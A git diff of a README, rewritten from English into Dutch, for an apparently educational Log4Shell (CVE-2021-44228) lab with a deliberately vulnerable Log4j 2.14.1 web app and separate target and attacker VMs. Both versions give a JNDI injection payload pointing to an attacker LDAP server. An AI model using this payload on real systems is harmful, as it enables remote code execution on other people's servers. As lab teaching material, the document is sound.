@@ -1,70 +1,65 @@
-# CVE-2021-44228 Log4jShell WebApp
+# Log4Shell Demonstratie (CVE-2021-44228)
 
-This is a minimal Java web application vulnerable to **Log4Shell (CVE-2021-44228)**, built with:
-
-- Java + Jetty (embedded)
-- Log4j 2.14.1 (vulnerable)
-- LDAP-server voor JNDI-exploits
-- Simple HTML form
-- Java exploit payload ('Exploit.class')
+Deze demo toont hoe de Log4Shell-kwetsbaarheid werkt door een gesplitste omgeving op te zetten met een **target machine (Debian)** en een **attacker machine (Kali Linux)**.
 
 ---
 
-## Quick Start
+## 🖥️ Target VM (Debian)
+Bevat de kwetsbare Java-webapp met Log4j 2.14.1.
 
-### Prerequisites:
-- Debian/Ubuntu-based system
-- Internet access
-- Python 3
-- git
-- Java Development Kit (javac)
+### Vereisten:
+- Debian/Ubuntu
+- Java JDK
 
-### Clone the repository:
+### Stappen:
 ```bash
+sudo apt update && sudo apt install -y default-jdk wget
 git clone https://github.com/SanderSchepers1993/CyberSec25.git
 cd CyberSec25/scripts
+./setup_target.sh
 ```
 
-### Run the setup script:
+Bezoek de webapp op: [http://<target-ip>:8080](http://<target-ip>:8080)
+
+---
+
+## ⚔️ Attacker VM (Kali)
+Start een LDAP- en HTTP-server om een exploit via JNDI te leveren.
+
+### Vereisten:
+- Kali Linux
+- Java JDK
+- Python3
+
+### Stappen:
 ```bash
-chmod +x run_exploit.sh
-./run_exploit.sh
+sudo apt update && sudo apt install -y default-jdk python3 wget
+git clone https://github.com/SanderSchepers1993/CyberSec25.git
+cd CyberSec25/scripts
+./setup_attacker.sh
 ```
 
-Open your browser and visit:
-[http://localhost:8080](http://localhost:8080)
-
----
-
-## Test Payload (work in progress)
-
-Submit the following payload to the form:
+Gebruik de volgende payload in het formulier op de target:
 ```text
-${jndi:ldap://Attacker-IP:ldap-port/a}
+${jndi:ldap://<attacker-ip>:1389/a}
 ```
-This will be **logged by Log4j**, potentially triggering the Log4Shell exploit **if you have a rogue LDAP server running**.
+
+De calculator op de attacker wordt geopend indien de aanval slaagt.
 
 ---
 
-## Project Structure
+## 📁 Structuur
 ```
 CyberSec25/
-├── Exploit/
-    └── Exploit.java/class
-├── ldap/
-    └── LDAP-SERVER (JNDI redirector)
-├── webapp/
-    └── Kwetbare webapp (Jetty + log4j)
-└── libs/
-    └── Dependencies (via setup.sh)
+├── exploit/         # Exploit.java
+├── ldap/            # LDAPServer.java (UnboundID)
+├── webapp/          # Jetty + Log4j kwetsbare app
 ├── scripts/
-    ├── run_exploits.sh
-    └── setup.sh
-├── README.md
+│   ├── setup_target.sh
+│   └── setup_attacker.sh
+├── log4j2.xml
 └── test_payload.txt
 ```
 
----
-
-## Disclaimer
-This project is intentionally vulnerable. Use responsibly in **isolated test environments** only. The author takes no responsibility for misuse.
+## ⚠️ Disclaimer
+Gebruik dit enkel in een veilige testomgeving. De auteur is niet verantwoordelijk voor verkeerd gebruik.
